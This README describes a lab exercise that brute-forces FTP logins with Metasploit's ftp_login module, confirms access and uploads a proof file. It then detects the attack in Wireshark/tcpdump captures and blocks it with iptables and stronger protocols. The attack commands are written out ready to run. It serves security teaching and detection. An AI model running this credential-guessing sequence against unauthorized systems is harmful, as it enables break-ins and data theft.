# FTP-Brute-Force-Attack-using-Metasploit-with-Threat-Detection-via-Wireshark
Demonstrate a controlled FTP brute-force attack using Metasploit’s auxiliary/scanner/ftp/ftp_login module, verify successful access, capture forensic evidence with Wireshark/tcpdump (FTP is plaintext), and show quick mitigation steps. Intended for lab/educational use only.
# Tools & Environment

Attacker: Kali Linux with Metasploit (msfconsole) — example IP 10.196.201.215.

Victim: Ubuntu/Linux with FTP service (vsftpd/proftpd) — example IP 10.196.201.145, port 21.

Network analysis: Wireshark / tcpdump to capture control traffic.

Client: ftp, FileZilla, or any command-line FTP client to verify access.

Mitigation: iptables for immediate host-based blocking.

# Quick background

FTP transmits control traffic (USER/PASS) in plaintext on port 21 by default — credentials and commands can be observed in packet captures.

Metasploit provides an ftp_login auxiliary module to automate username/password guessing — useful for lab demonstrations of weak credential risk.

Environment prep

Ensure the victim’s FTP server is running and reachable at 10.196.201.145.

On the attacker (Kali), prepare username and password lists (one item per line):

/root/user.txt — candidate usernames (e.g., cisco, analyst)

/root/passwords.txt — candidate passwords (e.g., password, net_secPW)

# Attack — step by step

Start Metasploit:

msfconsole


Configure and run the FTP brute-force module:

use auxiliary/scanner/ftp/ftp_login
set RHOSTS 10.196.201.145
set RPORT 21
set USER_FILE /root/user.txt
set PASS_FILE /root/passwords.txt
run


The module will iterate username/password combos and report any successes (e.g., Success: cisco:password123).

Verify credentials using an FTP client:

ftp cisco@10.196.201.145
# enter the discovered password when prompted


After login, list directories, download/upload files, or use STOR hacked.txt to upload a proof file (lab only).

# Evidence capture & analysis (Wireshark / tcpdump)

Capture control traffic on victim or network tap:

sudo tcpdump -i eth0 -s 0 -w ftp_attack.pcap port 21


Open ftp_attack.pcap in Wireshark. Look for:

Repeated USER and PASS exchanges in plaintext.

530 Login incorrect responses for failures and 230 Login successful on success.

Plaintext credentials visible in packet payloads and STOR/RETR commands for file transfers.

Automated pattern: many auth attempts from the same source IP in a short time window.

Useful Wireshark filters:

ftp — show FTP packets.

ftp.request.command == "USER" or ftp.request.command == "PASS" — focus on authentication traffic.

# Mitigation
Immediate

Block attacker IP:

sudo iptables -A INPUT -s <ATTACKER_IP> -p tcp --dport 21 -j DROP
sudo iptables -L INPUT -v -n


(Replace <ATTACKER_IP> with the source observed in captures.)

# Recommended long-term defenses

Replace plaintext FTP with SFTP (SSH-based) or FTPS (FTP over TLS).

Use strong credentials and enforce rotation.

Deploy automated banning tools (fail2ban, sshguard) to auto-block repeated failures.

Limit FTP access to trusted networks or management IPs.

Maintain centralized logs and periodic packet capture review for suspicious patterns.

# Safety & ethics

Only perform this testing in a controlled laboratory or on systems where you have explicit authorization. Unauthorized brute-force attacks or scanning against production/public systems is illegal and unethical.

# Summary

This README shows how to run an FTP brute-force test with Metasploit, capture cleartext evidence with Wireshark/tcpdump, verify access via an FTP client, and apply immediate iptables-based blocking. The exercise demonstrates why plaintext FTP is insecure and reinforces the need for secure protocols and automated protections.
